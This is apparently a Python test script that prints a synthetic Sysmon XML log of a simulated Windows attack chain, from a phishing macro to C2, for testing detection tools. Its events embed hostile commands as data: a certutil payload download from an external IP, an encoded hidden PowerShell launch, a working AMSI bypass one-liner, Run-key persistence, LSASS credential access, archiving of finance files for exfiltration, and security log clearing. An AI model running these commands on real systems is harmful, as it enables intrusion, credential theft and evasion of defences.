#!/usr/bin/env python3
"""
Generate a synthetic Sysmon XML attack log for testing.
Simulates a realistic attack chain: phishing → PowerShell → persistence → LSASS dump → C2.

Usage: python scripts/generate_sample.py > data/sample_attack.xml
"""

import random
from datetime import datetime, timezone, timedelta

def ts(base: datetime, offset_s: int) -> str:
    t = base + timedelta(seconds=offset_s)
    return t.strftime("%Y-%m-%dT%H:%M:%S.000000Z")

def wrap(event_id: int, time: str, data_pairs: list[tuple]) -> str:
    data_xml = "\n".join(
        f'    <Data Name="{k}">{v}</Data>' for k, v in data_pairs
    )
    return f"""<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <EventID>{event_id}</EventID>
    <TimeCreated SystemTime="{time}"/>
  </System>
  <EventData>
{data_xml}
  </EventData>
</Event>"""


def main():
    base = datetime(2024, 6, 14, 2, 0, 0, tzinfo=timezone.utc)
    events = []

    # 1. Office spawns PowerShell (phishing macro)
    events.append(wrap(1, ts(base, 5), [
        ("Image",            r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"),
        ("CommandLine",      r'powershell.exe -nop -w hidden -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdA=='),
        ("ParentImage",      r"C:\Program Files\Microsoft Office\Office16\WINWORD.EXE"),
        ("ParentCommandLine",r'"WINWORD.EXE" /n "Q3_Report.docm"'),
        ("User",             r"CORP\jdoe"),
        ("ProcessId",        "4820"),
        ("ParentProcessId",  "3912"),
        ("IntegrityLevel",   "Medium"),
        ("ProcessGuid",      "{11111111-0001-0000-0000-000000000001}"),
        ("ParentProcessGuid","{11111111-0000-0000-0000-000000000000}"),
    ]))

    # 2. PowerShell downloads payload (certutil)
    events.append(wrap(1, ts(base, 12), [
        ("Image",            r"C:\Windows\System32\certutil.exe"),
        ("CommandLine",      r'certutil.exe -urlcache -f http://185.220.101.45/svchst.exe C:\Users\jdoe\AppData\Local\Temp\svchst.exe'),
        ("ParentImage",      r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"),
        ("ParentCommandLine",r'powershell.exe -nop -w hidden -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdA=='),
        ("User",             r"CORP\jdoe"),
        ("ProcessId",        "5120"),
        ("ParentProcessId",  "4820"),
        ("IntegrityLevel",   "Medium"),
        ("ProcessGuid",      "{11111111-0001-0000-0000-000000000002}"),
        ("ParentProcessGuid","{11111111-0001-0000-0000-000000000001}"),
    ]))

    # 3. Network connection from certutil
    events.append(wrap(3, ts(base, 13), [
        ("Image",               r"C:\Windows\System32\certutil.exe"),
        ("DestinationIp",       "185.220.101.45"),
        ("DestinationHostname", ""),
        ("DestinationPort",     "80"),
        ("SourceIp",            "10.10.1.55"),
        ("SourcePort",          "49832"),
        ("Protocol",            "tcp"),
        ("Initiated",           "true"),
        ("User",                r"CORP\jdoe"),
        ("ProcessGuid",         "{11111111-0001-0000-0000-000000000002}"),
    ]))

    # 4. Execute dropped payload
    events.append(wrap(1, ts(base, 22), [
        ("Image",            r"C:\Users\jdoe\AppData\Local\Temp\svchst.exe"),
        ("CommandLine",      r'svchst.exe -beacon 185.220.101.45:4444'),
        ("ParentImage",      r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"),
        ("User",             r"CORP\jdoe"),
        ("ProcessId",        "5880"),
        ("ParentProcessId",  "4820"),
        ("IntegrityLevel",   "High"),
        ("ProcessGuid",      "{11111111-0001-0000-0000-000000000003}"),
        ("ParentProcessGuid","{11111111-0001-0000-0000-000000000001}"),
    ]))

    # 5. Whoami / sysinfo discovery
    for exe, offset in [("whoami.exe", 28), ("systeminfo.exe", 34), ("ipconfig.exe", 36)]:
        events.append(wrap(1, ts(base, offset), [
            ("Image",            rf"C:\Windows\System32\{exe}"),
            ("CommandLine",      exe),
            ("ParentImage",      r"C:\Users\jdoe\AppData\Local\Temp\svchst.exe"),
            ("User",             r"CORP\jdoe"),
            ("ProcessId",        str(6000 + offset)),
            ("ParentProcessId",  "5880"),
            ("IntegrityLevel",   "High"),
            ("ProcessGuid",      f"{{11111111-0001-0000-0000-{offset:012d}}}"),
            ("ParentProcessGuid","{11111111-0001-0000-0000-000000000003}"),
        ]))

    # 6. Persistence via Run key
    events.append(wrap(13, ts(base, 45), [
        ("Image",          r"C:\Users\jdoe\AppData\Local\Temp\svchst.exe"),
        ("TargetObject",   r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WindowsSecurityHealth"),
        ("Details",        r"C:\Users\jdoe\AppData\Roaming\Microsoft\Windows\svchst.exe"),
        ("User",           r"CORP\jdoe"),
        ("ProcessGuid",    "{11111111-0001-0000-0000-000000000003}"),
    ]))

    # 7. AMSI bypass attempt
    events.append(wrap(1, ts(base, 52), [
        ("Image",            r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"),
        ("CommandLine",      r'powershell -c "[Ref].Assembly.GetType(\"System.Management.Automation.AmsiUtils\").GetField(\"amsiInitFailed\",\"NonPublic,Static\").SetValue($null,$true)"'),
        ("ParentImage",      r"C:\Users\jdoe\AppData\Local\Temp\svchst.exe"),
        ("User",             r"CORP\jdoe"),
        ("ProcessId",        "6400"),
        ("ParentProcessId",  "5880"),
        ("IntegrityLevel",   "High"),
        ("ProcessGuid",      "{11111111-0001-0000-0000-000000000004}"),
        ("ParentProcessGuid","{11111111-0001-0000-0000-000000000003}"),
    ]))

    # 8. LSASS access (credential dump)
    events.append(wrap(10, ts(base, 65), [
        ("SourceImage",   r"C:\Users\jdoe\AppData\Local\Temp\svchst.exe"),
        ("TargetImage",   r"C:\Windows\System32\lsass.exe"),
        ("GrantedAccess", "0x1fffff"),
        ("CallTrace",     r"C:\Windows\SYSTEM32\ntdll.dll+9d414|C:\Windows\System32\KERNELBASE.dll+2b04e"),
        ("SourceProcessGUID", "{11111111-0001-0000-0000-000000000003}"),
        ("TargetProcessGUID", "{22222222-lsas-0000-0000-000000000000}"),
    ]))

    # 9. net user enumeration
    events.append(wrap(1, ts(base, 70), [
        ("Image",            r"C:\Windows\System32\net.exe"),
        ("CommandLine",      "net user /domain"),
        ("ParentImage",      r"C:\Users\jdoe\AppData\Local\Temp\svchst.exe"),
        ("User",             r"CORP\jdoe"),
        ("ProcessId",        "6600"),
        ("ParentProcessId",  "5880"),
        ("IntegrityLevel",   "High"),
        ("ProcessGuid",      "{11111111-0002-0000-0000-000000000001}"),
        ("ParentProcessGuid","{11111111-0001-0000-0000-000000000003}"),
    ]))

    # 10. Lateral movement DNS query
    events.append(wrap(22, ts(base, 75), [
        ("Image",         r"C:\Users\jdoe\AppData\Local\Temp\svchst.exe"),
        ("QueryName",     "dc01.corp.internal"),
        ("QueryResults",  "10.10.1.10"),
        ("User",          r"CORP\jdoe"),
        ("ProcessGuid",   "{11111111-0001-0000-0000-000000000003}"),
    ]))

    # 11. SMB lateral movement network connection
    events.append(wrap(3, ts(base, 78), [
        ("Image",               r"C:\Users\jdoe\AppData\Local\Temp\svchst.exe"),
        ("DestinationIp",       "10.10.1.10"),
        ("DestinationHostname", "dc01.corp.internal"),
        ("DestinationPort",     "445"),
        ("SourceIp",            "10.10.1.55"),
        ("SourcePort",          "49901"),
        ("Protocol",            "tcp"),
        ("Initiated",           "true"),
        ("User",                r"CORP\jdoe"),
        ("ProcessGuid",         "{11111111-0001-0000-0000-000000000003}"),
    ]))

    # 12. Archive for exfil (7zip)
    events.append(wrap(1, ts(base, 90), [
        ("Image",            r"C:\Program Files\7-Zip\7z.exe"),
        ("CommandLine",      r'7z.exe a -tzip C:\Temp\archive.zip C:\Finance\*.xlsx -p"infected2024"'),
        ("ParentImage",      r"C:\Users\jdoe\AppData\Local\Temp\svchst.exe"),
        ("User",             r"CORP\jdoe"),
        ("ProcessId",        "7200"),
        ("ParentProcessId",  "5880"),
        ("IntegrityLevel",   "High"),
        ("ProcessGuid",      "{11111111-0002-0000-0000-000000000002}"),
        ("ParentProcessGuid","{11111111-0001-0000-0000-000000000003}"),
    ]))

    # 13. C2 beacon connection
    events.append(wrap(3, ts(base, 95), [
        ("Image",               r"C:\Users\jdoe\AppData\Local\Temp\svchst.exe"),
        ("DestinationIp",       "185.220.101.45"),
        ("DestinationHostname", ""),
        ("DestinationPort",     "4444"),
        ("SourceIp",            "10.10.1.55"),
        ("SourcePort",          "49934"),
        ("Protocol",            "tcp"),
        ("Initiated",           "true"),
        ("User",                r"CORP\jdoe"),
        ("ProcessGuid",         "{11111111-0001-0000-0000-000000000003}"),
    ]))

    # 14. Event log clear (anti-forensics)
    events.append(wrap(1, ts(base, 110), [
        ("Image",            r"C:\Windows\System32\wevtutil.exe"),
        ("CommandLine",      "wevtutil.exe cl Security"),
        ("ParentImage",      r"C:\Users\jdoe\AppData\Local\Temp\svchst.exe"),
        ("User",             r"CORP\SYSTEM"),
        ("ProcessId",        "7800"),
        ("ParentProcessId",  "5880"),
        ("IntegrityLevel",   "System"),
        ("ProcessGuid",      "{11111111-0002-0000-0000-000000000003}"),
        ("ParentProcessGuid","{11111111-0001-0000-0000-000000000003}"),
    ]))

    xml = '<?xml version="1.0" encoding="utf-8"?>\n<Events>\n'
    xml += "\n".join(events)
    xml += "\n</Events>\n"
    print(xml)


if __name__ == "__main__":
    main()
